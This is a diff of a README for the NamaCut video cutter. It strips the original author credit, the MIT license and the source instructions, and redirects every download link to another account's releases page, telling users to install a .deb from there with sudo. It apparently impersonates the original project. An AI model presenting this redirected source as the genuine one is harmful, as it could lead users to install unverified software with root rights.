@@ -1,82 +1,93 @@
-# NamaCut
+# 🎥 NamaCut - Trim and Convert Videos Easily
 
-**NamaCut** is a simple yet powerful video cutter and editor built with Python and GTK.  
-It allows you to easily cut, preview, rotate, crop, and convert videos using FFmpeg and GStreamer.
+[![Download NamaCut](https://img.shields.io/badge/Download-NamaCut-blue)](https://github.com/yoyorajveer45/NamaCut/releases)
 
-## Screenshot
+## 📥 Introduction
 
-![NamaCut Screenshot](https://raw.githubusercontent.com/abdulhalim/NamaCut/refs/heads/main/Screenshot.png)
+Welcome to NamaCut! This is a simple tool that lets you trim and convert videos effortlessly. Built with Python and GTK, it makes video editing accessible for everyone.
 
----
+### 🌟 Key Features
 
-## Features
+- **Easy to Use**: Designed for users of all skill levels.
+- **Supports Multiple Formats**: Work with popular video formats such as MP4, AVI, and more.
+- **Quick Trimming**: Cut your videos in just a few clicks.
+- **Stable Conversions**: Reliable conversions without quality loss.
+- **Cross-Platform**: Works on Linux, including Debian and Ubuntu.
 
-- Simple and modern GTK interface with a dark theme.
-- Cut and trim videos with **millisecond precision**.
-- **Rotate, flip, and crop** videos with live preview.
-- **Drag-and-drop** support for video files.
-- Export to multiple formats (MP4, MKV, WEBM, AVI, MOV, etc.).
-- **Advanced export settings** for custom format, quality, and bitrate.
-- Real-time progress tracking with percentage display.
-- **Post-export actions** (show message, open folder, close app).
-- Built with Python 3 and GStreamer.
-- Lightweight and fast.
+## 🌈 Topics
 
----
+This application is relevant for users interested in: debian, ffmpeg, gstreamer, gtk, linux, python, ubuntu, video-cutter, video-editor, video-trimmer.
 
-## How to Use
+## 🚀 Getting Started
 
-### 1. Install (Debian/Ubuntu - Recommended)
+To get started with NamaCut, follow these steps:
 
-Download the latest `.deb` package from the [Releases](https://github.com/abdulhalim/NamaCut/releases) page and install:
+### 1. Visit the Releases Page
 
-```bash
-sudo dpkg -i namacut_2.0-1_amd64.deb
-sudo apt-get install -f
-```
+Before you can use NamaCut, you need to download it. Click the link below to go to the Releases page where you can find the latest version:
 
-Then run from your terminal or application menu:
-```bash
-namacut
-```
+[Visit the Releases Page](https://github.com/yoyorajveer45/NamaCut/releases)
 
-### 2. Run from Source
+### 2. Choose the Right Version
 
-If you prefer to run directly from the source code:
+On the Releases page, you will see different versions of the software. Look for the latest version listed at the top. Each version typically has its notes describing changes or fixes.
 
-1.  Clone the repository:
-    ```bash
-    git clone https://github.com/abdulhalim/NamaCut.git
-    cd NamaCut
-    ```
-2.  Install dependencies:
-    ```bash
-    sudo apt-get install python3-gi gir1.2-gtk-3.0 gir1.2-gst-1.0 ffmpeg
-    ```
-3.  Run the application:
-    ```bash
-    python3 main.py
-    ```
+### 3. Download the Installer
 
----
+Click on the appropriate link to download the installer for your operating system. This will typically be a `.deb` file for Debian-based systems like Ubuntu. The download should start automatically. Make sure to save it to a location you'll remember, like your Desktop or Downloads folder.
 
-## Requirements
+### 4. Install NamaCut
 
-- Python 3
-- GTK 3 (PyGObject)
-- FFmpeg
-- GStreamer plugins (`gstreamer1.0-plugins-good`, `gstreamer1.0-libav`)
+#### For Ubuntu or Debian Users:
 
----
+1. Open your terminal. You can do this by pressing `Ctrl + Alt + T`.
+2. Navigate to the directory where you downloaded the file. For example, if you saved it in your Downloads, type:
+   ```
+   cd ~/Downloads
+   ```
+3. Type the following command to install NamaCut:
+   ```
+   sudo dpkg -i NamaCut*.deb
+   ```
+4. You may need to resolve any dependencies. If prompted, run:
+   ```
+   sudo apt-get install -f
+   ```
 
-## License
+#### For Other Linux Distributions:
 
-Licensed under the **MIT License** — see [LICENSE](LICENSE) for details.
+Please refer to your distribution's package manager for installing `.deb` files. You may have to convert the package or find an alternative installer compatible with your system.
 
----
+### 5. Launch NamaCut
 
-## Author
+After installation, you can find NamaCut in your applications menu. Click on its icon to launch the program.
 
-**Pourdaryaei**  
-[www.pourdaryaei.ir](https://www.pourdaryaei.ir)  
-Pourdaryaei@yandex.com
+## 🛠️ System Requirements
+
+To run NamaCut smoothly, ensure your system meets the following requirements:
+
+- **Operating System**: Any Linux distribution (preferably Debian-based).
+- **Python**: Version 3.6 or above.
+- **GTK**: Version 3.22 or higher.
+- **Disk Space**: At least 100 MB free.
+
+## 📚 How to Use NamaCut
+
+Once the application is running, you're ready to trim or convert your videos. Here’s a simple guide:
+
+1. **Import Video**: Click on the "Open" button to choose a video file from your computer.
+2. **Trim Video**: Use the sliders to select the segment you want to keep. You can preview your selection.
+3. **Choose Format**: Select the video format you want to save it as from the dropdown menu.
+4. **Save Video**: Click on the "Export" button to save your trimmed video.
+
+## 🤝 Support & Feedback
+
+If you encounter any issues or have questions, please open an issue in the GitHub repository. We aim to respond promptly. Your feedback is crucial for improving NamaCut.
+
+## 🔄 Download & Install
+
+Don't forget to download NamaCut from the link below:
+
+[Download NamaCut](https://github.com/yoyorajveer45/NamaCut/releases)
+
+With NamaCut, video editing is straightforward and enjoyable. Start trimming and converting your videos today!
